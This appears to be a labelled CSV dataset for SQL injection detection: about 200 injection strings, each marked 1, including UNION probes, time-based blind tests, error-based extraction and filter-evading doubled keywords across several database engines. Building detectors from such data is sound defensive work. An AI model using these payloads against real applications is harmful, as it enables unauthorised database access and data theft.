Query,Label
"-9837"" whwhereere 7201  =  7201 uniunionon all selselectect 7201,7201,7201--",1
"1""  )    (  sselectelect   (  case when   (  5451  =  5451  )   then regexp_substriinng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nulnulll  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   frfromom iinnfoorrmation_schema.system_users  )   aandnd   (  ""jebr"" lilikeke ""jebr",1
"-5344"" uunionnion all seselectlect 9482,9482,9482,9482,9482,9482,9482,9482,9482--",1
-8069'   )    )    oorr 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sselectelect   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   anandd    (    (   'qbvz'  =  'qbvz,1
"selselectect benchmark  (  5000000,md5  (  0x4c4d6142   )    )    aandnd ""%""  =  """,1
"-6890""   )    )    oorr 5903  =    (  'qqpjq'||  (  seselectlect case 5903 when 5903 then 1 else 0 end ffromrom rdb$databasdatabasee  )  ||'qzvzq'  )   anandd    (    (   ""ftho"" liklikee ""ftho",1
"1%'   )    )    uniounionn all seleselectct nulnulll,nulnulll,nulnulll--",1
-3998'   )    )    oorr 3038  =  3038,1
"-2862'   )    )     )   uunionnion all seselectlect 6649,6649--",1
"1   )    )    oorr 4411  =    (  seleselectct count  (  *  )   frofromm sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   aandnd    (    (   3003  =  3003",1
"1 wherwheree 3175  =  3175 oorr 8421  =    (  seleselectct count  (  *  )   frofromm generate_series  (  1,5000000   )    )   --",1
 (  selselectect   (  case when   (  6986  =  6986  )   then 6986 else 6986*  (  selselectect 6986 frfromom mysql.db  )   end   )    ) ,1
"1 anandd 3202  =  lilikeke  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   -- kegk",1
"-9583'   )    )    uniunionon all seleselectct 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",1
1%'   )    )     )   anandd 3715 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seleselectct   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   anandd    (    (     (  '%'  =  ',1
1%' anandd   (  seselectlect * frfromom   (  seselectlect  (  sleep  (  5   )    )     )  gcrr  )  #,1
"-5391 oorr make_ssetet  (  9354  =  9354,7185  )  # ptyy",1
"-5322"" uniounionn all selselectect 6494,6494,6494,6494,6494,6494--",1
selselectect sleep  (  5  )   aandnd    (    (     (  8354  =  8354,1
"1 aandnd elt  (  4249  =  4249,7259  )  -- meef",1
1' iinn boolean mode  )   oorr   (  seleselectct * ffromrom   (  seleselectct  (  sleep  (  5   )    )     )  ydpu  )  #,1
"1""  )   as ypfa whewherere 6128  =  6128",1
1'+  (  selecselectt plhk whewherere 6540  =  6540,1
"-3102  )   uniounionn all seleselectct 6707,6707,6707,6707--",1
"1 anandd 4241  =  convert  (  iinnt,  (  selselectect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selselectect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # dwxl",1
"-9634'   )    )     )   uniunionon all seselectlect 4141,4141#",1
"-5640""   )    )    oorr 9792  =  2728--",1
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  selselectect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   anandd 'ctac' liklikee 'ctac",1
-5764 oorr 3038  =  3038,1
selecselectt   (  case when   (  4996  =  1734  )   then 1 else 4996*  (  selecselectt 4996 ffromrom master..sysdatabdatabaseases  )   end  )  --,1
"selecselectt count  (  *  )   ffromrom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 anandd   (  ""snwx"" liklikee ""snwx",1
1 uniounionn all selselectect nunullll--,1
"sselectelect count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 aandnd    (    (   ""%""  =  """,1
1' wherwheree 8159  =  8159 uniunionon all seselectlect nulnulll#,1
"1""  )   as uuth wherwheree 8555  =  8555 ununionion all selselectect nulnulll,nulnulll#",1
"-6194"" oorr 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
"seleselectct * frofromm generate_series  (  3551,3551,case when   (  3551  =  6451  )   then 1 else 0 end  )   limlimitit 1--",1
"call regexp_substriinng  (  repeat  (  right  (  char  (  2385  )  ,0  )  ,500000000  )  ,nunullll  )  --",1
-4313%'  )   oorr 6872  =  6872 aandnd   (  '%'  =  ',1
1'   )    )     )   anandd 6969  =    (  sselectelect 6969 frfromom pg_sleep  (  5   )    )    anandd    (    (     (  'eihl'  =  'eihl,1
selselectect   (  case when   (  3140  =  4625  )   then 1 else 3140*  (  selselectect 3140 frfromom master..sysddatabaseatabases  )   end  )  --,1
"-9861' uniounionn all selselectect 5710,5710,5710,5710,5710--",1
"1 wwherehere 8273  =  8273 uniounionn all selselectect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"1%'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1""   )    )    as swix whewherere 2459  =  2459 oorr 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"1   )    )     )   anandd   (  selselectect 9067 frfromom  (  selselectect count  (  *  )  ,concat  (  0x7171706a71,  (  selselectect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x frfromom iinnfoorrmation_schema.character_ssetets group bbyy x  )  a  )   anandd    (    (     (  8382  =  8382",1
1  )   as selm whewherere 5759  =  5759,1
"-6112""  )   uunionnion all sselectelect 8203,8203,8203,8203,8203,8203,8203--",1
-8369  )   wherwheree 7234  =  7234 oorrdoorrderer bbyy 1--,1
"1' oorr elt  (  6272  =  6272,sleep  (  5   )    )   ",1
"1""   )    )     )   ununionion all sselectelect nnullull,nnullull#",1
"1   )    )     )   aandnd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )   aandnd    (    (     (  2997  =  2997",1
"seselectlect benchmark  (  5000000,md5  (  0x4c4d6142   )    )    aandnd   (  ""%""  =  """,1
1'||  (  sselectelect 'zqwd' wwherehere 1647  =  1647 rliklikee sleep  (  5   )    )   ||',1
"1""   )    )     )    (  sselectelect   (  case when   (  4587  =  4587  )   then regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   ffromrom   (  valuevaluess  (  0   )    )     )   aandnd    (    (     (  ""fcpm""  =  ""fcpm",1
1 wwherehere 2239  =  2239 anandd 6969  =    (  selselectect 6969 frfromom pg_sleep  (  5   )    )   --,1
1'||  (  selselectect 'xemx' ffromrom dual whwhereere 4683  =  4683 oorr sleep  (  5  )  #,1
seselectlect   (  case when   (  4291  =  6937  )   then 4291 else 4291*  (  seselectlect 4291 frfromom mysql.db  )   end  )  #,1
"1""  )   whewherere 8462  =  8462 anandd updupdateatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  selselectect   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
"-1055' ununionion all sselectelect 7758,7758,7758,7758,7758,7758--",1
"-2630'   )    )    as xavw whwhereere 6291  =  6291 uunionnion all seleselectct 6291,6291,6291,6291,6291,6291,6291,6291,6291#",1
"1' whewherere 8451  =  8451 uniunionon all sselectelect nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll#",1
1' whwhereere 8635  =  8635 oorroorrderder bbyy 1--,1
-8447 wwherehere 2850  =  2850 oorr 7147  =  3262,1
"1 anandd elt  (  4249  =  4249,7259  )  ",1
"1%'   )    )    oorr 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1"" whewherere 6179  =  6179",1
1'  )   whewherere 6842  =  6842,1
"1'   )    )    as qzyp whwhereere 5081  =  5081 oorr 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
-3937   )    )    oorr 3038  =  3038,1
"1%' oorr 8315  =    (  sselectelect count  (  *  )   frofromm sysibm.systatablebles as t1,sysibm.systatablebles as t2,sysibm.systatablebles as t3  )   anandd '%'  =  '",1
1'+  (  sselectelect 'diet' wherwheree 7004  =  7004 rliklikee sleep  (  5   )    )   +',1
1'  )   as cdrm wherwheree 4595  =  4595 oorrdoorrderer bbyy 1#,1
"1""   )    )    as zbfj wwherehere 2285  =  2285",1
"1'  )   whewherere 4407  =  4407 aandnd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )  --",1
1 anandd 4595  =  4595#,1
-9429'  )   oorroorrderder bbyy 1--,1
1%'   )    )    rlilikeke   (  seselectlect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    aandnd    (    (   '%'  =  ',1
"1""   )    )    anandd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    anandd    (    (   ""alkz""  =  ""alkz",1
seselectlect   (  case when   (  5152  =  7853  )   then 5152 else 5152*  (  seselectlect 5152 frfromom mysql.db  )   end  )  #,1
"1%"" uunionnion all sselectelect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"1 oorr 5356  =    (  seselectlect count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'   )    )     )   anandd 8514  =    (  sselectelect count  (  *  )   frfromom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.ttableables as t3  )   anandd    (    (     (  'peyy'  =  'peyy",1
"1  )   aandnd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1  )   as zmjm wherwheree 9125  =  9125 oorr char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nnullull  )  --",1
"-7802'   )    )     )   oorr elt  (  8778  =  9974,9974  )   aandnd    (    (     (  'glsq' lilikeke 'glsq",1
1 oorr sleep  (  5  )  #,1
"1"" aandnd elt  (  1210  =  1210,sleep  (  5   )    )    aandnd ""zhxm""  =  ""zhxm",1
"1   )    )    as myyh whwhereere 5116  =  5116 oorr 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1',  (  sselectelect   (  case when   (  4209  =  5879  )   then 1 else 4209*  (  sselectelect 4209 frofromm iinnfoorrmation_schema.character_sesetts  )   end   )    )   ",1
1'  )   rlilikeke   (  selecselectt   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    anandd   (  'gzpx'  =  'gzpx,1
"1'  )   oorr   (  selecselectt 2*  (  if   (    (   selecselectt * frofromm   (  selecselectt concat  (  0x7171706a71,  (  selecselectt   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   aandnd   (  'bzgs' lilikeke 'bzgs",1
"-2314""   )    )    oorr make_sesett  (  9354  =  9354,7185  )   anandd    (    (   ""uatq"" llikeike ""uatq",1
"selselectect benchmark  (  5000000,md5  (  0x4c4d6142   )    )    anandd   (  'dvpw'  =  'dvpw",1
"1'   )    )    as nxhp wherwheree 2649  =  2649 oorr 9643  =    (  selecselectt count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabltablees as t3  )  --",1
"-2287'   )    )    ununionion all sselectelect 1200,1200,1200,1200,1200#",1
"-6184""   )    )    oorr 2724 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selselectect   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   anandd    (    (   ""rovr""  =  ""rovr",1
selecselectt   (  case when   (  6002  =  9048  )   then 6002 else 6002*  (  selecselectt 6002 frofromm mysql.db  )   end  )  #,1
1'||  (  selecselectt 'ywfo' ffromrom dual whwhereere 4168  =  4168 rlilikeke sleep  (  5  )  #,1
"1"" oorr 6793  =    (  sselectelect 6793 frofromm pg_sleep  (  5   )    )    anandd ""pwwb"" llikeike ""pwwb",1
"1%'   )    )     )    (  selselectect   (  case when   (  4587  =  4587  )   then regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   frofromm   (  valuvalueses  (  0   )    )     )   aandnd    (    (     (  '%'  =  '",1
"1""   )    )    aandnd   (  selecselectt 2*  (  if   (    (   selecselectt * frfromom   (  selecselectt concat  (  0x7171706a71,  (  selecselectt   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   aandnd    (    (   ""llgb"" liklikee ""llgb",1
"-5202 uunionnion all selecselectt 5332,5332,5332,5332,5332,5332,5332#",1
"1""  )   aandnd 6969  =    (  sselectelect 6969 frofromm pg_sleep  (  5   )    )    aandnd   (  ""btht""  =  ""btht",1
"-6307' wwherehere 8916  =  8916 ununionion all sselectelect 8916,8916,8916,8916,8916,8916,8916--",1
"1' iinn boolean mode  )   oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  seleselectct   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #",1
1   )    )    uniounionn all selecselectt nnullull#,1
"-4955%' uunionnion all sselectelect 5928,5928--",1
"1' aandnd elt  (  2266  =  7467,7467  )  ",1
1' aandnd   (  selecselectt * frofromm   (  selecselectt  (  sleep  (  5   )    )     )  fzno  )   aandnd 'mepp'  =  'mepp,1
"1,  (  seleselectct   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  seleselectct 3717 ffromrom master..sysddatabaseatabases  )   end   )    )   ",1
"1'  )   oorr elt  (  6272  =  6272,sleep  (  5   )    )    aandnd   (  'tmbs'  =  'tmbs",1
-4901  )   oorr 3407  =  6442#,1
1' whewherere 4134  =  4134 aandnd 1102  =  6300--,1
"1'   )    )     )   aandnd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  seselectlect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    aandnd    (    (     (  'hllf'  =  'hllf",1
"-1598""   )    )    oorr elt  (  5329  =  9628,9628  )   aandnd    (    (   ""hyxq"" llikeike ""hyxq",1
 (  seleselectct * frfromom   (  seleselectct  (  sleep  (  5   )    )     )  srmq   )    )   +',1
"1""  )   oorr   (  seleselectct * frfromom   (  seleselectct  (  sleep  (  5   )    )     )  sddo  )  #",1
"-3604'  )   as fyev wherwheree 7259  =  7259 uunionnion all selecselectt 7259,7259,7259,7259--",1
-6433%'   )    )    oorr 9323  =  9323#,1
-8836%'  )   oorr 4856  =  3891,1
"1 aandnd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1%'   )    )    oorr 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   aandnd    (    (   '%'  =  '",1
 (  7098  =  7098 anandd sleep  (  5   )    ) ,1
"1""  )   as jiyl whewherere 4893  =  4893 uniunionon all selselectect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
-3243 oorr 2266  =  3583#,1
"1'  )   ununionion all seselectlect nnullull,nnullull,nnullull,nnullull,nnullull--",1
"1%""   )    )     )   anandd 3202  =  liklikee  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )    anandd    (    (     (  ""%""  =  """,1
"1' anandd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  seleselectct   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    anandd 'pphf'  =  'pphf",1
"1""   )    )    rliklikee   (  seselectlect * frfromom   (  seselectlect  (  sleep  (  5   )    )     )  sgvo  )   aandnd    (    (   ""bxct"" liklikee ""bxct",1
-9120'   )    )    oorr 8571  =  8571--,1
1'+  (  seselectlect naiw wwherehere 4924  =  4924,1
-9389'  )   oorr 8859  =  3989--,1
"-9923%'   )    )     )   uniounionn all seselectlect 8985,8985,8985,8985,8985,8985,8985#",1
1'   )    )    aandnd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   aandnd    (    (   'hbwk' llikeike 'hbwk,1
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  seleselectct   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   aandnd   (  ""tgdu""  =  ""tgdu",1
"-1510'   )    )     )   uniunionon all selecselectt 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1
"1""  )   uunionnion all selecselectt nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll#",1
"elt  (  8192  =  8192,sleep  (  5   )    )   ",1
end aandnd    (    (   'zeyr'  =  'zeyr,1
"1""   )    )    as luon wwherehere 4676  =  4676 rlilikeke sleep  (  5  )  #",1
"1""  )   wwherehere 6138  =  6138 aandnd 8594  =    (  selselectect 8594 frofromm pg_sleep  (  5   )    )   --",1
"1"" whwhereere 3740  =  3740 rlilikeke sleep  (  5  )  #",1
"1'   )    )     )   aandnd elt  (  4249  =  4249,7259  )   aandnd    (    (     (  'kgdt' liklikee 'kgdt",1
1  )   as tngy wwherehere 8956  =  8956 rlilikeke   (  selecselectt   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
"-4230""   )    )     )   uunionnion all selselectect 6962,6962,6962,6962,6962,6962#",1
-3540 wwherehere 7302  =  7302 oorr 4493  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1  )   as lfra whewherere 2669  =  2669 anandd uupdatepdatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  sselectelect   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
1'  )   rlilikeke sleep  (  5  )   anandd   (  'qsub' lilikeke 'qsub,1
"1%""   )    )     )   uniunionon all seleselectct nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll,nunullll--",1
"1'+  (  sselectelect 'uzaw' whwhereere 9900  =  9900 oorr 8315  =    (  sselectelect count  (  *  )   ffromrom sysibm.systtableables as t1,sysibm.systtableables as t2,sysibm.systtableables as t3   )    )   +'",1
"1""  )   as dlfq whewherere 8410  =  8410",1
"1  )   as guru wwherehere 7615  =  7615 uunionnion all sselectelect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"1  )   aandnd make_sesett  (  1559  =  4863,4863  )  ",1
-9484' oorr   (  7129  =  2349  )  *2349 aandnd 'fcsa' llikeike 'fcsa,1
"1'  )   oorr   (  selecselectt 9173 ffromrom  (  selecselectt count  (  *  )  ,concat  (  0x7171706a71,  (  selecselectt   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x ffromrom iinnfoorrmation_schema.character_ssetets group bbyy x  )  a  )  ",1
"1"" wwherehere 5328  =  5328 anandd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1""   )    )     )   uniounionn all seselectlect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
1'  )   as ihsc wwherehere 3978  =  3978,1
"-6125'||  (  selselectect 'hwnm' whewherere 1428  =  1428 uunionnion all selselectect 1428,1428,1428,1428,1428,1428#",1
selselectect   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as iinnt  )  /  (  selselectect 0 frofromm dual  )   end  )   frofromm dual--,1
1 rllikeike   (  selecselectt * ffromrom   (  selecselectt  (  sleep  (  5   )    )     )  sgvo  ) ,1
"1'   )    )    aandnd row  (  6237,7469  )  >  (  selecselectt count  (  *  )  ,concat  (  0x7171706a71,  (  selecselectt   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frofromm   (  selecselectt 5192 uniunionon selecselectt 3785 uniunionon selecselectt 3931 uniunionon selecselectt 7158  )  a group bbyy x  )   aandnd    (    (   'pbtf'  =  'pbtf",1
"1'  )   whwhereere 7391  =  7391 oorr   (  selselectect 9173 frfromom  (  selselectect count  (  *  )  ,concat  (  0x7171706a71,  (  selselectect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x frfromom iinnfoorrmation_schema.character_sesetts group bbyy x  )  a  )  --",1
1'+  (  selecselectt dklj wherwheree 3265  =  3265,1
"1'  )   aandnd 3202  =  llikeike  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   ",1
"1'   )    )    anandd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sselectelect   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd    (    (   'cbwx'  =  'cbwx",1
-3422%'  )   oorr 5903  =    (  'qqpjq'||  (  seleselectct case 5903 when 5903 then 1 else 0 end frofromm rdb$dadatabasetabase  )  ||'qzvzq'  )   anandd   (  '%'  =  ',1
selecselectt pg_sleep  (  5  )   aandnd    (    (     (  9476  =  9476,1
"1 oorr row  (  1045,7562  )  >  (  selselectect count  (  *  )  ,concat  (  0x7171706a71,  (  selselectect   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x ffromrom   (  selselectect 8488 uunionnion selselectect 5584 uunionnion selselectect 3051 uunionnion selselectect 1210  )  a group bbyy x  )  -- fwzl",1
-3083  )   oorr 5221  =  7829,1
"1'   )    )    ununionion all selselectect nnullull,nnullull,nnullull--",1
"1""  )   as vcvw whwhereere 2445  =  2445 anandd 8594  =    (  seleselectct 8594 frofromm pg_sleep  (  5   )    )   --",1
waitfoorr delay '0:0:5' aandnd    (    (     (  'ozjl' lilikeke 'ozjl,1
"1%' oorr updatupdateexml  (  1808,concat  (  0x2e,0x7171706a71,  (  sselectelect   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   aandnd '%'  =  '",1
"1'   )    )    anandd   (  sselectelect 2*  (  if   (    (   sselectelect * frfromom   (  sselectelect concat  (  0x7171706a71,  (  sselectelect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   anandd    (    (   'yzdp'  =  'yzdp",1
"-3411'   )    )     )   uniounionn all seselectlect 3185,3185,3185,3185,3185,3185,3185,3185--",1
"-6254"" whewherere 8941  =  8941 oorr elt  (  1032  =  1032,3623  )  --",1
"1' aandnd 3580  =    (  sselectelect count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tatablebles as t3  )  --",1
1   )    )     )   oorrdoorrderer bbyy 1#,1
"-5027%""   )    )    oorr 5903  =    (  'qqpjq'||  (  selselectect case 5903 when 5903 then 1 else 0 end frofromm rdb$databasdatabasee  )  ||'qzvzq'  )   anandd    (    (   ""%""  =  """,1
seleselectct   (  case when   (  4006  =  1276  )   then 1 else 4006*  (  seleselectct 4006 frofromm master..sysdadatabasetabases  )   end  )  --,1
"1'+  (  seleselectct 'tzey' wherwheree 4491  =  4491 ununionion all seleselectct nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
"seleselectct count  (  *  )   frofromm generate_series  (  1,5000000  )  # fnck",1
1 ooorrderrder bbyy 1#,1
1   )    )    as xbii wherwheree 2262  =  2262 oorr sleep  (  5  )  --,1
-9340  )   whewherere 5462  =  5462 oorr 3038  =  3038,1
1'  )   oorr sleep  (  5  )   aandnd   (  'fizk'  =  'fizk,1
"-6405  )   as ilah whwhereere 5145  =  5145 uniunionon all selselectect 5145,5145,5145,5145,5145--",1
1   )    )    anandd   (  4169  =  9887  )  *9887 anandd    (    (   1137  =  1137,1
"seselectlect count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 anandd 'bnfu' lilikeke 'bnfu",1
1  )   whwhereere 6472  =  6472,1
"1%""   )    )    aandnd row  (  6237,7469  )  >  (  seselectlect count  (  *  )  ,concat  (  0x7171706a71,  (  seselectlect   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x ffromrom   (  seselectlect 5192 uunionnion seselectlect 3785 uunionnion seselectlect 3931 uunionnion seselectlect 7158  )  a group bbyy x  )   aandnd    (    (   ""%""  =  """,1
-4595'  )   wwherehere 4892  =  4892 oorroorrderder bbyy 1--,1
